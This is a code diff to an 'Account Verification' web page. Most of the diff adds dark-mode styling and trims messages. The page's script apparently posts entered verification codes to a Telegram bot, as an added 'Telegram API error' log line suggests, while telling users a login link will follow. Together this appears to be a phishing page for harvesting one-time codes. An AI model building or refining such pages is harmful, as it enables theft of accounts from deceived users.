@@ -5,44 +5,88 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Account Verification</title>
   <style>
+    :root {
+      --bg-color: #f4f4f4;
+      --container-bg: #fff;
+      --text-color: #333;
+      --input-border: #ccc;
+      --button-bg: #007BFF;
+      --button-hover: #0056b3;
+      --copy-bg: #eee;
+      --success: green;
+      --error: red;
+    }
+
+    body.dark {
+      --bg-color: #121212;
+      --container-bg: #1e1e1e;
+      --text-color: #eee;
+      --input-border: #555;
+      --button-bg: #1a73e8;
+      --button-hover: #135abc;
+      --copy-bg: #2c2c2c;
+      --success: #90ee90;
+      --error: #f28b82;
+    }
+
     body {
       font-family: 'Segoe UI', sans-serif;
-      background-color: #f4f4f4;
+      background-color: var(--bg-color);
       padding: 2rem;
       display: flex;
       flex-direction: column;
       align-items: center;
+      color: var(--text-color);
+      transition: background 0.3s, color 0.3s;
     }
+
+    .theme-toggle {
+      position: absolute;
+      top: 1rem;
+      right: 1rem;
+      background: none;
+      border: 2px solid var(--text-color);
+      padding: 0.3rem 0.7rem;
+      border-radius: 5px;
+      cursor: pointer;
+      color: var(--text-color);
+    }
+
     .container {
-      background: #fff;
+      background: var(--container-bg);
       padding: 2rem;
       max-width: 400px;
       width: 100%;
       border-radius: 10px;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      transition: background 0.3s;
     }
+
     h2 {
       margin-bottom: 1.5rem;
       text-align: center;
-      color: #333;
     }
+
     label {
       display: block;
       margin-top: 1rem;
-      color: #333;
       font-weight: 600;
     }
+
     input {
       width: 100%;
       padding: 0.7rem;
       margin-top: 0.5rem;
       border-radius: 5px;
-      border: 1px solid #ccc;
+      border: 1px solid var(--input-border);
+      background: transparent;
+      color: var(--text-color);
     }
+
     button {
       margin-top: 1.5rem;
       padding: 0.75rem;
-      background-color: #007BFF;
+      background-color: var(--button-bg);
       color: #fff;
       border: none;
       width: 100%;
@@ -50,28 +94,34 @@
       font-size: 16px;
       cursor: pointer;
     }
+
     button:hover {
-      background-color: #0056b3;
+      background-color: var(--button-hover);
     }
+
     .message {
       margin-top: 1rem;
       font-weight: bold;
       text-align: center;
     }
+
     .success {
-      color: green;
+      color: var(--success);
     }
+
     .error {
-      color: red;
+      color: var(--error);
     }
+
     .copy-link {
-      background: #eee;
+      background: var(--copy-bg);
       padding: 0.5rem;
       border-radius: 4px;
-      word-break: break-all;
+      word-break: break-word;
       font-size: 13px;
       margin-top: 1rem;
     }
+
     .copy-btn {
       margin-top: 0.5rem;
       padding: 0.5rem;
@@ -82,12 +132,14 @@
       cursor: pointer;
       width: 100%;
     }
+
     .copy-btn:hover {
       background: #218838;
     }
   </style>
 </head>
 <body>
+  <button class="theme-toggle" onclick="toggleTheme()">Toggle Theme</button>
   <div class="container">
     <h2>Account Verification</h2>
     <form id="verifyForm">
@@ -102,27 +154,30 @@
 
     <div id="message" class="message"></div>
 
-    <p style="margin-top: 1.5rem; font-size: 14px; color: #555;">
-      🔗 <strong>Copy this link to access the page anytime you receive your verification code either through your phone number or email address:</strong>
+    <p style="margin-top: 1.5rem; font-size: 14px;">
+      🔗 <strong>Copy this link to access the page anytime:</strong>
     </p>
     <div class="copy-link" id="pageUrl"></div>
     <button class="copy-btn" onclick="copyPageUrl()">Copy Link</button>
-    
-    <button id="resendBtn" style="margin-top: 20px;">Resend Code</button>
-<p id="resendMessage" style="color: green; display: none;">Redirecting... Please re-enter your information.</p>
-
-<script>
-document.getElementById("resendBtn").addEventListener("click", () => {
-  document.getElementById("resendMessage").style.display = "block";
-  setTimeout(() => {
-    window.location.href = "signup.html"; // or whatever your form page is named
-  }, 2000);
-});
-</script>
   </div>
 
   <script>
-    // Display current page URL
+    // Theme toggle
+    function toggleTheme() {
+      document.body.classList.toggle('dark');
+      const isDark = document.body.classList.contains('dark');
+      localStorage.setItem('theme', isDark ? 'dark' : 'light');
+    }
+
+    // Apply saved theme
+    (function applyThemeFromStorage() {
+      const savedTheme = localStorage.getItem('theme');
+      if (savedTheme === 'dark') {
+        document.body.classList.add('dark');
+      }
+    })();
+
+    // Show current page URL
     document.getElementById("pageUrl").textContent = window.location.href;
 
     function copyPageUrl() {
@@ -171,13 +226,17 @@ document.getElementById("resendBtn").addEventListener("click", () => {
         body: JSON.stringify(payload)
       }).then(response => {
         if (response.ok) {
-          messageBox.textContent = "✅ Verification sent successfully! You’ll receive your login link shortly! if your code is correct.";
+          messageBox.textContent = "✅ Verification sent successfully! You’ll receive your login link shortly.";
           messageBox.className = "message success";
         } else {
+          response.text().then(err => {
+            console.error("Telegram API error:", err);
+          });
           messageBox.textContent = "❌ Verification failed. Please try again.";
           messageBox.className = "message error";
         }
-      }).catch(() => {
+      }).catch((error) => {
+        console.error("Network error:", error);
         messageBox.textContent = "❌ Network error. Try again.";
         messageBox.className = "message error";
       });
